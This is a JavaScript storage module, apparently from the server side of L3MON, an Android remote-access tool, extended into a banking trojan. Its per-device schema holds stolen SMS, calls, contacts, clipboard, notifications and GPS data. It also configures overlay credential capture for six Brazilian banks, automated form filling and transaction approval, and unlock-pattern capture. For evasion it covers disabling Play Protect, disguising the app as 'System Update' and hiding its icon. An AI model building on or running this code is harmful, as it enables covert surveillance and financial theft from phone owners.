const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    fs = require('fs'),
    path = require('path');

const mainDbPath = process.env.L3MON_MAINDB_PATH
    ? path.resolve(process.env.L3MON_MAINDB_PATH)
    : path.resolve(__dirname, '..', 'maindb.json');
const clientDataDir = process.env.L3MON_DATA_DIR
    ? path.resolve(process.env.L3MON_DATA_DIR)
    : path.resolve(__dirname, '..', 'clientData');

fs.mkdirSync(path.dirname(mainDbPath), { recursive: true });
fs.mkdirSync(clientDataDir, { recursive: true });

const adapter = new FileSync(mainDbPath);
const db = lowdb(adapter);

const prisma = require('./prismaClient');
const usePrisma = process.env.DATABASE_DRIVER !== 'lowdb' && Boolean(process.env.DATABASE_URL);

async function initializeDatabase() {
    if (!usePrisma || !prisma?.admin) {
        return { ready: true, usePrisma: false };
    }

    try {
        await prisma.$connect();
        await prisma.admin.upsert({
            where: { username: 'admin' },
            update: {},
            create: {
                username: 'admin',
                password: '',
                loginToken: '',
                logs: [],
                ipLog: [],
            },
        });
        return { ready: true, usePrisma: true };
    } catch (error) {
        console.warn('[databaseGateway] Prisma bootstrap failed, falling back to compatibility mode:', error.message);
        return { ready: false, usePrisma: false, error };
    }
}

async function createAdminRecord(payload) {
    if (usePrisma) return prisma.admin.create({ data: payload });
    return payload;
}

async function createClientRecord(payload) {
    if (usePrisma) return prisma.client.create({ data: payload });
    return payload;
}

async function upsertClientData(clientId, kind, payload) {
    if (!clientId) return null;
    if (usePrisma) {
        const entry = await prisma.clientDataEntry.create({ data: { clientId, kind, payload } });
        return entry;
    }
    return { clientId, kind, payload };
}

async function listClientData(clientId, kind) {
    if (!clientId) return [];
    if (usePrisma) {
        const entries = await prisma.clientDataEntry.findMany({ where: { clientId, kind }, orderBy: { createdAt: 'desc' } });
        return entries.map((entry) => ({ ...entry.payload, createdAt: entry.createdAt }));
    }
    return [];
}

async function clearClientData(clientId, kind) {
    if (!clientId) return 0;
    if (usePrisma) {
        const result = await prisma.clientDataEntry.deleteMany({ where: { clientId, kind } });
        return result.count;
    }
    return 0;
}

async function listClients() {
    if (usePrisma) {
        const clients = await prisma.client.findMany({ orderBy: { updatedAt: 'desc' } });
        return clients.map((client) => ({
            clientId: client.clientId,
            isOnline: client.isOnline,
            data: client.data,
            updatedAt: client.updatedAt,
        }));
    }

    return db.get('clients').value() || [];
}

async function upsertClientState(clientId, state) {
    if (!clientId) return null;
    if (!usePrisma) return { clientId, state };

    const existingClient = await prisma.client.findUnique({ where: { clientId } });

    if (existingClient) {
        return prisma.client.update({
            where: { clientId },
            data: {
                isOnline: Boolean(state.isOnline),
                data: { ...existingClient.data, ...state, clientId },
            },
        });
    }

    return prisma.client.create({
        data: {
            clientId,
            isOnline: Boolean(state.isOnline),
            data: { ...state, clientId },
        },
    });
}

function createCompatibilityLayer() {
    return db;
}

const compatibilityDb = createCompatibilityLayer();

db.defaults({
    admin: {
        username: 'admin',
        password: '',
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

class PathProxy {
    constructor(store, pathSegments = []) {
        this.store = store;
        this.pathSegments = Array.isArray(pathSegments) ? pathSegments : [pathSegments];
    }

    _normalizePath(path) {
        if (Array.isArray(path)) return path;
        if (path === undefined || path === null || path === '') return [];
        return String(path).split('.').filter(Boolean);
    }

    get(path) {
        return new PathProxy(this.store, [...this.pathSegments, ...this._normalizePath(path)]);
    }

    value() {
        return this.store._getValue(this.pathSegments);
    }

    assign(value) {
        this.store._setValue(this.pathSegments, value);
        return this;
    }

    push(value) {
        const current = this.value();
        const next = Array.isArray(current) ? current : [];
        next.push(value);
        this.store._setValue(this.pathSegments, next);
        return this;
    }

    remove() {
        this.store._deletePath(this.pathSegments);
        return this;
    }

    write() {
        this.store._persist();
        return this;
    }

    find(query = {}) {
        const current = this.value();
        if (!Array.isArray(current)) return new PathProxy(this.store, this.pathSegments);

        const index = current.findIndex((item) => Object.entries(query).every(([key, expected]) => item?.[key] === expected));
        if (index === -1) return new PathProxy(this.store, this.pathSegments);

        return new PathProxy(this.store, [...this.pathSegments, index]);
    }

    sortBy(field) {
        return {
            reverse: () => this,
            take: () => this,
            value: () => {
                const data = Array.isArray(this.value()) ? [...this.value()] : [];
                return data.sort((a, b) => (a?.[field] || '').toString().localeCompare((b?.[field] || '').toString()));
            },
        };
    }
}

class PrismaClientStore {
    constructor(clientID) {
        this.clientID = clientID;
        this.root = this._createDefaultState(clientID);
        this.loaded = false;
        this._loadFromDatabase();
    }

    _createDefaultState(clientID) {
        return {
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0,
            },
            downloads: [],
            currentFolder: [],
            atsConfig: {
                enabled: false,
                autoClickEnabled: false,
                clickDelayMs: 500,
                dataMapping: {
                    email: 'usuario.ficticioso@example.com',
                    phone: '+5511999999999',
                    password: 'SenhaFictica123!',
                    address: 'Rua Fictícia, 123',
                    cpf: '12345678900',
                    creditCard: '4532015112830366',
                    name: 'Usuário Fictício',
                    pix: '12345678900',
                },
                fieldPatterns: [
                    'email', 'phone', 'password', 'address', 'cpf',
                    'creditCard', 'account', 'login', 'usuario', 'pix',
                ],
                buttonPatterns: [
                    'enviar', 'send', 'submit', 'confirmar', 'confirm',
                    'ok', 'continuar', 'continue', 'proximo', 'next',
                    'avancar', 'forward', 'realizar', 'efetuar', 'fazer',
                ],
                atsLog: [],
            },
            defenseConfig: {
                playProtectDisabled: false,
                securityNotificationsMuted: false,
                defenseLog: [],
            },
            permissionGrantConfig: {
                autoGrantEnabled: false,
                grantedPermissions: [],
                permissionLog: [],
            },
            gestureSimulationConfig: {
                recordedGestures: [],
                gestureLog: [],
            },
            transactionApprovalConfig: {
                enableAutoApproval: false,
                autoApprovalLog: [],
            },
            dynamicScreenUnlockConfig: {
                capturedPatterns: [],
                unlockLog: [],
                autoUnlockEnabled: false,
            },
            overlayInjectionConfig: {
                enabledBanks: ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'],
                activeOverlays: [],
                capturedCredentials: [],
                overlayLog: [],
                monitoringEnabled: false,
            },
            customizedFormsCaptureConfig: {
                enabledBanks: { itau: true, bradesco: true, caixa: true, nubank: true, bb: true, santander: true },
                realTimeCaptureEnabled: false,
                capturedData: [],
                captureLog: [],
                templateVersions: {
                    itau: '1.0',
                    bradesco: '1.0',
                    caixa: '1.0',
                    nubank: '1.0',
                    bb: '1.0',
                    santander: '1.0',
                },
            },
            bypassProtectionsConfig: {
                bypassEnabled: false,
                androidVersion: 0,
                restrictedSettingsBypassed: false,
                accessibilityServiceForced: false,
                installationMethod: 'none',
                spoofedAppName: 'System Update',
                spoofedAppType: 'system_update',
                bypassLog: [],
                detectedProtections: [],
                bypassStatus: {},
            },
            advancedHideIconConfig: {
                hideEnabled: false,
                iconHidden: false,
                backgroundServiceActive: false,
                activationMethod: 'none',
                activationCode: '',
                smsActivationEnabled: false,
                smsActivationPhrase: 'activate_l3mon',
                launcherIconRemoved: false,
                launcherName: 'com.etechd.l3mon',
                launcherAlias: 'Hidden Service',
                hideLog: [],
                hiddenStatus: {},
                detectedLaunchers: [],
                restoreMethod: 'none',
            },
        };
    }

    _loadFromDatabase() {
        if (!usePrisma || !prisma?.client) return;

        prisma.client.findUnique({ where: { clientId: this.clientID } }).then((record) => {
            if (record?.data && typeof record.data === 'object') {
                this.root = { ...this._createDefaultState(this.clientID), ...record.data };
            }
            this.loaded = true;
        }).catch(() => {
            this.loaded = true;
        });
    }

    _getValue(pathSegments = []) {
        let current = this.root;
        for (const segment of pathSegments) {
            if (current === undefined || current === null) return undefined;
            current = current[segment];
        }
        return current;
    }

    _setValue(pathSegments = [], value) {
        if (!pathSegments.length) {
            this.root = value;
            return;
        }

        let current = this.root;
        for (let index = 0; index < pathSegments.length - 1; index += 1) {
            const segment = pathSegments[index];
            const nextValue = current[segment];
            if (nextValue === undefined || nextValue === null || typeof nextValue !== 'object' || Array.isArray(nextValue)) {
                current[segment] = typeof pathSegments[index + 1] === 'number' ? [] : {};
            }
            current = current[segment];
        }

        current[pathSegments[pathSegments.length - 1]] = value;
    }

    _deletePath(pathSegments = []) {
        if (!pathSegments.length) {
            this.root = {};
            return;
        }

        let current = this.root;
        for (let index = 0; index < pathSegments.length - 1; index += 1) {
            if (current === undefined || current === null) return;
            current = current[pathSegments[index]];
        }

        if (current && typeof current === 'object') {
            delete current[pathSegments[pathSegments.length - 1]];
        }
    }

    _persist() {
        if (!usePrisma || !prisma?.client || !this.clientID) return;

        void prisma.client.upsert({
            where: { clientId: this.clientID },
            update: { data: this.root, updatedAt: new Date() },
            create: { clientId: this.clientID, data: this.root, isOnline: false },
        }).catch(() => {});
    }

    get(path) {
        return new PathProxy(this, path);
    }
}

class clientdb {
    constructor(clientID) {
        if (usePrisma && prisma?.client) {
            return new PrismaClientStore(clientID);
        }

        const clientFilePath = path.join(clientDataDir, `${clientID}.json`);
        fs.mkdirSync(path.dirname(clientFilePath), { recursive: true });
        let cdb = lowdb(new FileSync(clientFilePath));
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0,
            },
            downloads: [],
            currentFolder: [],
            atsConfig: {
                enabled: false,
                autoClickEnabled: false,
                clickDelayMs: 500,
                dataMapping: {
                    email: 'usuario.ficticioso@example.com',
                    phone: '+5511999999999',
                    password: 'SenhaFictica123!',
                    address: 'Rua Fictícia, 123',
                    cpf: '12345678900',
                    creditCard: '4532015112830366',
                    name: 'Usuário Fictício',
                    pix: '12345678900',
                },
                fieldPatterns: [
                    'email', 'phone', 'password', 'address', 'cpf',
                    'creditCard', 'account', 'login', 'usuario', 'pix',
                ],
                buttonPatterns: [
                    'enviar', 'send', 'submit', 'confirmar', 'confirm',
                    'ok', 'continuar', 'continue', 'proximo', 'next',
                    'avancar', 'forward', 'realizar', 'efetuar', 'fazer',
                ],
                atsLog: [],
            },
            defenseConfig: {
                playProtectDisabled: false,
                securityNotificationsMuted: false,
                defenseLog: [],
            },
            permissionGrantConfig: {
                autoGrantEnabled: false,
                grantedPermissions: [],
                permissionLog: [],
            },
            gestureSimulationConfig: {
                recordedGestures: [],
                gestureLog: [],
            },
            transactionApprovalConfig: {
                enableAutoApproval: false,
                autoApprovalLog: [],
            },
            dynamicScreenUnlockConfig: {
                capturedPatterns: [],
                unlockLog: [],
                autoUnlockEnabled: false,
            },
            overlayInjectionConfig: {
                enabledBanks: ['itau', 'bradesco', 'caixa', 'nubank', 'bb', 'santander'],
                activeOverlays: [],
                capturedCredentials: [],
                overlayLog: [],
                monitoringEnabled: false,
            },
            customizedFormsCaptureConfig: {
                enabledBanks: { itau: true, bradesco: true, caixa: true, nubank: true, bb: true, santander: true },
                realTimeCaptureEnabled: false,
                capturedData: [],
                captureLog: [],
                templateVersions: {
                    itau: '1.0',
                    bradesco: '1.0',
                    caixa: '1.0',
                    nubank: '1.0',
                    bb: '1.0',
                    santander: '1.0',
                },
            },
            bypassProtectionsConfig: {
                bypassEnabled: false,
                androidVersion: 0,
                restrictedSettingsBypassed: false,
                accessibilityServiceForced: false,
                installationMethod: 'none',
                spoofedAppName: 'System Update',
                spoofedAppType: 'system_update',
                bypassLog: [],
                detectedProtections: [],
                bypassStatus: {},
            },
            advancedHideIconConfig: {
                hideEnabled: false,
                iconHidden: false,
                backgroundServiceActive: false,
                activationMethod: 'none',
                activationCode: '',
                smsActivationEnabled: false,
                smsActivationPhrase: 'activate_l3mon',
                launcherIconRemoved: false,
                launcherName: 'com.etechd.l3mon',
                launcherAlias: 'Hidden Service',
                hideLog: [],
                hiddenStatus: {},
                detectedLaunchers: [],
                restoreMethod: 'none',
            },
        }).write();
        return cdb;
    }
}

module.exports = {
    maindb: compatibilityDb,
    clientdb: clientdb,
    usePrisma,
    prisma,
    initializeDatabase,
    createAdminRecord,
    createClientRecord,
    upsertClientData,
    listClientData,
    clearClientData,
    listClients,
    upsertClientState,
};


